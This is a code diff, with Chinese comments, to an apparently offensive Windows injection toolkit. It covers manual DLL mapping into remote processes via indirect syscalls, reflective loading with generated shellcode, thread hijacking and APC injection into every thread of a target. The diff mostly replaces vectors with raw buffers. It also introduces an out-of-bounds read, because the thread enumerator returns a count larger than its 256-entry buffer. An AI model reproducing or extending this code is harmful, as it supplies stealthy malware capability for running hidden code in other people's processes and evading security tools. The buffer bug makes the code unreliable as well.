@@ -29,12 +29,22 @@ ManualMapper::MapResult ManualMapper::MapDllFromFile(
     if (hFile == INVALID_HANDLE_VALUE) return {};
 
     DWORD fileSize = GetFileSize(hFile, nullptr);
-    std::vector<BYTE> fileData(fileSize);
+    if (fileSize == 0 || fileSize == INVALID_FILE_SIZE) {
+        CloseHandle(hFile);
+        return {};
+    }
+    BYTE* fileData = (BYTE*)VirtualAlloc(nullptr, fileSize, MEM_COMMIT, PAGE_READWRITE);
+    if (!fileData) {
+        CloseHandle(hFile);
+        return {};
+    }
     DWORD bytesRead;
-    ReadFile(hFile, fileData.data(), fileSize, &bytesRead, nullptr);
+    ReadFile(hFile, fileData, fileSize, &bytesRead, nullptr);
     CloseHandle(hFile);
 
-    return MapDllFromBuffer(hProcess, fileData.data(), fileSize);
+    MapResult result = MapDllFromBuffer(hProcess, fileData, fileSize);
+    VirtualFree(fileData, 0, MEM_RELEASE);
+    return result;
 }
 
 ManualMapper::MapResult ManualMapper::MapDllFromBuffer(
@@ -64,19 +74,20 @@ ManualMapper::MapResult ManualMapper::MapDllFromBuffer(
     }
 
     // 2. 在本进程中准备 PE 镜像
-    std::vector<BYTE> localImage(imageSize);
-    memset(localImage.data(), 0, imageSize);
+    BYTE* localImage = (BYTE*)VirtualAlloc(nullptr, imageSize, MEM_COMMIT, PAGE_READWRITE);
+    if (!localImage) return result;
+    memset(localImage, 0, imageSize);
 
     // 复制 PE 头
     SIZE_T headersSize = nt->OptionalHeader.SizeOfHeaders;
-    memcpy(localImage.data(), dllData, headersSize);
+    memcpy(localImage, dllData, headersSize);
 
     // 复制各区段到正确的位置
     auto* firstSection = IMAGE_FIRST_SECTION(nt);
     for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         if (firstSection[i].SizeOfRawData > 0) {
             auto src = reinterpret_cast<const BYTE*>(dllData) + firstSection[i].PointerToRawData;
-            auto dst = localImage.data() + firstSection[i].VirtualAddress;
+            auto dst = localImage + firstSection[i].VirtualAddress;
             memcpy(dst, src, firstSection[i].SizeOfRawData);
         }
     }
@@ -87,9 +98,9 @@ ManualMapper::MapResult ManualMapper::MapDllFromBuffer(
         auto relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
         if (relocDir.VirtualAddress && relocDir.Size) {
             auto* reloc = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(
-                localImage.data() + relocDir.VirtualAddress);
+                localImage + relocDir.VirtualAddress);
             auto* relocEnd = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(
-                localImage.data() + relocDir.VirtualAddress + relocDir.Size);
+                localImage + relocDir.VirtualAddress + relocDir.Size);
 
             while (reloc < relocEnd && reloc->SizeOfBlock > 0) {
                 DWORD entryCount = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
@@ -98,7 +109,7 @@ ManualMapper::MapResult ManualMapper::MapDllFromBuffer(
                 for (DWORD j = 0; j < entryCount; j++) {
                     if (entries[j] >> 12 == IMAGE_REL_BASED_DIR64) {
                         auto* patch = reinterpret_cast<uintptr_t*>(
-                            localImage.data() + reloc->VirtualAddress + (entries[j] & 0xFFF));
+                            localImage + reloc->VirtualAddress + (entries[j] & 0xFFF));
                         *patch += delta;
                     }
                 }
@@ -116,11 +127,11 @@ ManualMapper::MapResult ManualMapper::MapDllFromBuffer(
     auto importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
     if (importDir.VirtualAddress && importDir.Size) {
         auto* importDesc = reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR*>(
-            localImage.data() + importDir.VirtualAddress);
+            localImage + importDir.VirtualAddress);
 
         for (int i = 0; importDesc[i].Name; i++) {
             auto dllName = reinterpret_cast<const char*>(
-                localImage.data() + importDesc[i].Name);
+                localImage + importDesc[i].Name);
 
             HMODULE hMod = ApiResolver::GetModuleBase(dllName);
 
@@ -129,13 +140,15 @@ ManualMapper::MapResult ManualMapper::MapDllFromBuffer(
             if (!hMod && hProcess != GetCurrentProcess()) {
                 // 尝试从远程进程获取模块基址
                 // 系统DLL已在远程进程中加载, 使用 StealthProcess 枚举
-                // K3: GetProcessModules 接受 HANDLE, 不是 DWORD
-                auto remoteModules = StealthProcess::GetProcessModules(hProcess);
-                for (auto& mod : remoteModules) {
+                // ★ BUILD 500: 使用固定数组替代 std::vector — GetProcessModules 返回 int
+                StealthProcess::ModuleInfo remoteModules[64];
+                int modCount = StealthProcess::GetProcessModules(hProcess, remoteModules, 64);
+                for (int j = 0; j < modCount; j++) {
                     // 比较模块名 (简化: 不区分大小写)
-                    std::string modNameA(mod.name.begin(), mod.name.end());
-                    if (_stricmp(modNameA.c_str(), dllName) == 0) {
-                        hMod = reinterpret_cast<HMODULE>(mod.baseAddress);
+                    char modNameA[260] = {};
+                    WideCharToMultiByte(CP_ACP, 0, remoteModules[j].name, -1, modNameA, sizeof(modNameA), nullptr, nullptr);
+                    if (_stricmp(modNameA, dllName) == 0) {
+                        hMod = reinterpret_cast<HMODULE>(remoteModules[j].baseAddress);
                         break;
                     }
                 }
@@ -148,9 +161,9 @@ ManualMapper::MapResult ManualMapper::MapDllFromBuffer(
             if (!hMod) continue;
 
             auto* thunk = reinterpret_cast<uintptr_t*>(
-                localImage.data() + importDesc[i].FirstThunk);
+                localImage + importDesc[i].FirstThunk);
             auto* origThunk = reinterpret_cast<uintptr_t*>(
-                localImage.data() + (importDesc[i].OriginalFirstThunk ?
+                localImage + (importDesc[i].OriginalFirstThunk ?
                     importDesc[i].OriginalFirstThunk : importDesc[i].FirstThunk));
 
             for (int j = 0; origThunk[j]; j++) {
@@ -159,7 +172,7 @@ ManualMapper::MapResult ManualMapper::MapDllFromBuffer(
                         GetProcAddress(hMod, MAKEINTRESOURCEA(origThunk[j] & 0xFFFF)));
                 } else {
                     auto* importByName = reinterpret_cast<const IMAGE_IMPORT_BY_NAME*>(
-                        localImage.data() + origThunk[j]);
+                        localImage + origThunk[j]);
                     thunk[j] = reinterpret_cast<uintptr_t>(
                         GetProcAddress(hMod, importByName->Name));
                 }
@@ -170,7 +183,7 @@ ManualMapper::MapResult ManualMapper::MapDllFromBuffer(
     // 5. 写入目标进程
     SIZE_T bytesWritten = 0;
     SysWriteVirtualMemory(hProcess, reinterpret_cast<PVOID>(remoteBase),
-        localImage.data(), imageSize, &bytesWritten, SyscallMethod::Indirect);
+        localImage, imageSize, &bytesWritten, SyscallMethod::Indirect);
 
     // 6. 修改区段保护
     // (略: 遍历区段, 设置正确的 PAGE_* 属性)
@@ -183,6 +196,7 @@ ManualMapper::MapResult ManualMapper::MapDllFromBuffer(
     result.entryPoint = entryPoint;
     result.success = true;
 
+    VirtualFree(localImage, 0, MEM_RELEASE);
     return result;
 }
 
@@ -190,7 +204,7 @@ ManualMapper::MapResult ManualMapper::MapDllFromBuffer(
 // ReflectiveLoader
 // ============================================================
 
-std::vector<BYTE> ReflectiveLoader::GenerateLoaderStub() {
+void ReflectiveLoader::GenerateLoaderStub(BYTE* outBuf, int* outLen) {
     // 生成位置无关的 ReflectiveLoader 入口 shellcode
     // 此 stub 调用嵌入在 DLL 中的 ReflectiveLoader 函数
     //
@@ -199,7 +213,7 @@ std::vector<BYTE> ReflectiveLoader::GenerateLoaderStub() {
 
     // 简化 stub: 在当前上下文中搜索 Magic 标记定位 ReflectiveLoader
     // (完整实现需要位置无关的 GetIp + 搜索 + 调用逻辑)
-    return ManualMapper::GenerateEntrypointShellcode(0, 0, DLL_PROCESS_ATTACH);
+    ManualMapper::GenerateEntrypointShellcode(0, 0, DLL_PROCESS_ATTACH, outBuf, outLen);
 }
 
 uintptr_t ReflectiveLoader::Execute(HANDLE hProcess,
@@ -216,8 +230,9 @@ ManualMapper::MapResult ManualMapper::MapDllToSelf(const void* dllData, SIZE_T d
     return MapDllFromBuffer(GetCurrentProcess(), dllData, dllSize);
 }
 
-std::vector<BYTE> ManualMapper::GenerateEntrypointShellcode(
-    uintptr_t dllMainAddr, uintptr_t imageBase, DWORD fdwReason) {
+void ManualMapper::GenerateEntrypointShellcode(
+    uintptr_t dllMainAddr, uintptr_t imageBase, DWORD fdwReason,
+    BYTE* outBuf, int* outLen) {
 
     // 生成调用 DllMain 的 x64 shellcode
     // push imageBase; push fdwReason; push 1; call [dllMainAddr]; ret
@@ -234,7 +249,8 @@ std::vector<BYTE> ManualMapper::GenerateEntrypointShellcode(
     *reinterpret_cast<uintptr_t*>(code + 12) = fdwReason;
     *reinterpret_cast<uintptr_t*>(code + 22) = dllMainAddr;
 
-    return std::vector<BYTE>(code, code + sizeof(code));
+    memcpy(outBuf, code, sizeof(code));
+    *outLen = sizeof(code);
 }
 
 ManualMapper::MapResult ManualMapper::ReflectiveLoad(
@@ -310,11 +326,17 @@ bool ThreadHijacker::HijackThread(HANDLE hProcess, DWORD threadId,
     // 构建完整的 hijack shellcode:
     // [shellcode] + [保存原始 CONTEXT] + [恢复 RIP/RSP 并跳回原始地址]
     SIZE_T fullSize = shellcodeSize + 128;
-    std::vector<BYTE> fullCode(fullSize);
+    BYTE* fullCode = (BYTE*)VirtualAlloc(nullptr, fullSize, MEM_COMMIT, PAGE_READWRITE);
+    if (!fullCode) {
+        VirtualFreeEx(hProcess, remoteCode, 0, MEM_RELEASE);
+        ResumeThread(hThread);
+        CloseHandle(hThread);
+        return false;
+    }
 
     // 复制用户 shellcode (安全校验: shellcodeSize 不超出 fullSize)
     if (shellcodeSize > 0 && shellcodeSize <= fullSize) {
-        memcpy(fullCode.data(), shellcode, shellcodeSize);
+        memcpy(fullCode, shellcode, shellcodeSize);
     }
 
     // 追加恢复代码 (shellcode 执行完后恢复并跳回)
@@ -322,14 +344,17 @@ bool ThreadHijacker::HijackThread(HANDLE hProcess, DWORD threadId,
 
     // 写入远程进程
     SIZE_T written;
-    if (!WriteProcessMemory(hProcess, remoteCode, fullCode.data(),
-                            fullCode.size(), &written) || written != fullCode.size()) {
+    if (!WriteProcessMemory(hProcess, remoteCode, fullCode,
+                            fullSize, &written) || written != fullSize) {
         // 写入失败, 恢复线程并清理
+        VirtualFree(fullCode, 0, MEM_RELEASE);
         ResumeThread(hThread);
         VirtualFreeEx(hProcess, remoteCode, 0, MEM_RELEASE);
         CloseHandle(hThread);
         return false;
     }
+
+    VirtualFree(fullCode, 0, MEM_RELEASE);
 
     // 修改 RIP 指向 shellcode
     ctx.Rip = reinterpret_cast<uintptr_t>(remoteCode);
@@ -526,31 +551,36 @@ bool StealthThread::SetThreadStackBase(HANDLE hThread, PVOID stackBase) {
 // APCInjector
 // ============================================================
 
-std::vector<DWORD> APCInjector::EnumerateThreads(DWORD processId) {
-    std::vector<DWORD> threads;
+int APCInjector::EnumerateThreads(DWORD processId, DWORD* outBuf, int maxThreads) {
+    int count = 0;
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if (hSnap == INVALID_HANDLE_VALUE) return threads;
+    if (hSnap == INVALID_HANDLE_VALUE) return 0;
 
     THREADENTRY32 te32 = { sizeof(te32) };
     if (Thread32First(hSnap, &te32)) {
         do {
             if (te32.th32OwnerProcessID == processId) {
-                threads.push_back(te32.th32ThreadID);
+                if (count < maxThreads) {
+                    outBuf[count] = te32.th32ThreadID;
+                }
+                count++;
             }
         } while (Thread32Next(hSnap, &te32));
     }
 
     CloseHandle(hSnap);
-    return threads;
+    return count;
 }
 
 bool APCInjector::InjectToAllThreads(HANDLE hProcess,
                                       const void* shellcode, SIZE_T shellcodeSize) {
     DWORD pid = GetProcessId(hProcess);
-    auto threads = EnumerateThreads(pid);
+    DWORD threadBuf[256];
+    int threadCount = EnumerateThreads(pid, threadBuf, 256);
 
     bool anySuccess = false;
-    for (DWORD tid : threads) {
+    for (int i = 0; i < threadCount; i++) {
+        DWORD tid = threadBuf[i];
         HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
         if (hThread) {
             InjectToThread(hThread, shellcode, shellcodeSize);
